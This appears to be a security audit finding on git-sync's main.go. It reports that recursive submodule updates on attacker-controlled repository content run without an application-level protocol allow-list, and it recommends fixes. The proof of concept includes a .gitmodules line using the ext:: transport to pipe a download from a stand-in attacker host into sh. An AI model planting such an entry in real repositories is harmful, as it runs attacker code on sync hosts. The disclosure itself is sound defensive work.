### Title
Unrestricted `git submodule update` on attacker-controlled repo content allows protocol/command injection - (File: main.go)

### Summary
`git-sync`'s worktree configuration step unconditionally runs `git submodule update --init [--recursive]` against whatever `.gitmodules` content exists in the *synced* (attacker-controllable) repository, with no protocol allow-list or other defense-in-depth restriction applied by git-sync itself. This mirrors the structural flaw in the HomeFi report: a downstream trust decision (there, "is this `_msgSender()` really the admin/contract"; here, "is this submodule URL/transport safe to invoke") is delegated entirely to a component the attacker can influence (the forwarder / the synced repo content), with no additional guardrail in the calling code.

### Finding Description
`configureWorktree` checks out the fetched hash and then, if submodules are enabled (the default is `recursive`, see [README.md:2875-2877]()), runs:

```go
submodulesArgs := []string{"submodule", "update", "--init"}
if git.submodules == submodulesRecursive {
    submodulesArgs = append(submodulesArgs, "--recursive")
}
...
git.Run(ctx, worktree.Path(), submodulesArgs...)
``` [1](#0-0) 

The `.gitmodules` file (including submodule `url =` and `path =` fields) is fully attacker-controlled content — it comes from the very repository/ref being synced. `git-sync` sets `--submodules=recursive` by default [2](#0-1)  and invokes `git submodule update --init --recursive` on it with no visible hardening: no `GIT_ALLOW_PROTOCOL`/`protocol.*.allow` allow-list is configured anywhere in `main.go`, and no `--no-recurse-submodules`-style opt-in-only default is enforced by the tool itself (confirmed by search — the only matches for `GIT_ALLOW_PROTOCOL`/`protocol.file.allow` in the repo are in the e2e test harness, which explicitly passes `-c protocol.file.allow=always` when *setting up* test fixtures, not in the production `main.go` code path). This means git-sync's safety against dangerous submodule transports (e.g. `ext::`) is entirely delegated to whatever version of the system `git` binary happens to be installed, with no application-level allow-list as a second line of defense.

If an attacker can get a malicious commit/ref merged or mirrored into the synced upstream repo (or compromises it), they can add a `.gitmodules` entry using a transport like `ext::sh -c ...` (historically exploitable in unpatched git versions, CVE-2017-1000117 / CVE-2020-11008 family) or a submodule path/symlink crafted to escape the worktree, and `git-sync`'s recursive submodule update will execute it under the git-sync process's UID.

### Impact Explanation
If reachable (i.e., the git binary in the container image is not patched against submodule protocol abuse, or an operator has otherwise weakened protocol restrictions), the impact is command execution or writes outside `--root` in the git-sync sidecar — exactly the class of impact the rules require (code execution / file write-delete outside `--root`). Because git-sync sidecars commonly run with elevated mount access to shared volumes consumed by an application container [3](#0-2) , compromise of the sidecar can propagate to the app container's data.

### Likelihood Explanation
Low-to-medium. Modern git (>=2.38.1) blocks unsafe submodule protocols like `ext::` and local paths by default, so exploitability depends on the git version bundled in the git-sync container image, which this analysis cannot verify (index does not contain the Dockerfile's base image / git version pin with certainty). The absence of an explicit, git-sync-managed protocol allow-list is a real defense-in-depth gap regardless of git version, but it only becomes a full compromise if the underlying git binary is unpatched or misconfigured.

### Recommendation
- Explicitly set `GIT_ALLOW_PROTOCOL` (or `protocol.*.allow` git config) to a minimal allow-list (e.g. `file:ssh:git:http:https`) before invoking any `git submodule update`, rather than relying solely on the system git's built-in defaults.
- Consider making `--submodules` default to `off` (current default is `recursive`) so that recursing into untrusted, attacker-influenced repo content is an explicit opt-in rather than the default behavior.
- Pin/verify the git version in the container image to a release with the submodule protocol hardening, and add a CI check that fails the build if an older/vulnerable git is bundled.

### Proof of Concept
Conceptual (not verified end-to-end against a live git-sync deployment, since that requires a specific unpatched git binary):
1. Attacker gains write access to (or supplies) the upstream repository referenced by `--repo`, or compromises a dependency the sync target includes.
2. Attacker commits a `.gitmodules` file: `url = ext::sh -c 'curl attacker.com/x|sh'`.
3. On next `SyncRepo` cycle, `configureWorktree` runs `git submodule update --init --recursive` [4](#0-3)  in the worktree containing that `.gitmodules`, with no protocol restriction configured by git-sync, executing the attacker's command if the git binary in use does not block the `ext::` transport by default.
